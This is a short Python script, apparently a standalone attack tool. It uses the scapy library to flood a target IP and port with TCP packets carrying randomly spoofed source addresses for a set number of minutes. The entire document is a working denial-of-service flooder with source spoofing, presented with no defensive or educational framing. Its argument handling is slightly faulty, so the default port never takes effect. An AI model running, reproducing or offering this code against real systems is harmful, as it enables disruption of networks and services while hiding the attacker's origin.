#! /usr/bin/env python

import sys
import time
from scapy.all import IP, TCP, send
from random import randint

ttl = time.time() + 60*int(sys.argv[3]);
dstIp = sys.argv[1]
if len(sys.argv) > 1:
    dstPrt = sys.argv[2]
else:
    dstPrt = 80
dstPrt = int(dstPrt)
while 1:
    rand1 = randint(1,254)
    rand2 = randint(1,254)
    rand3 = randint(1,254)
    rand4 = randint(1,254)
    srcIp = str(rand1) + "." + str(rand2) + "." + str(rand3) + "." + str(rand4)
    p = send(IP(src=srcIp, dst=dstIp)/TCP(dport=dstPrt))
    if time.time() > ttl:
        break


